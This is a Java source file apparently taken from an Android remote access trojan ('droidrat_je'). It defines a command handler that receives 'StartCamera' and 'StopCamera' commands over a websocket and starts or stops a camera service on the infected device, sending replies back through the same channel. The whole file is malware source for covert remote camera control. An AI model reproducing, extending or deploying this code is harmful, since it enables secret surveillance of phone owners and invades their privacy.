package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.service.camera.CameraService;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;

public class CameraCommand extends CommandFather {

    private final Context context;

    public CameraCommand(Context context) {
        this.context = context;
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "Camera Event";
            switch (rawCommandArray[1]) {

                case "StartCamera":
                    Log.d(TAG, "StartCamera");
                    Intent startCameraIntent = new Intent(context, CameraService.class);
                    startCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.startService(startCameraIntent);
                    break;

                case "StopCamera":
                    Log.d(TAG, "StopCamera");
                    Intent stopCameraIntent = new Intent(context, CameraService.class);
                    stopCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.stopService(stopCameraIntent);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
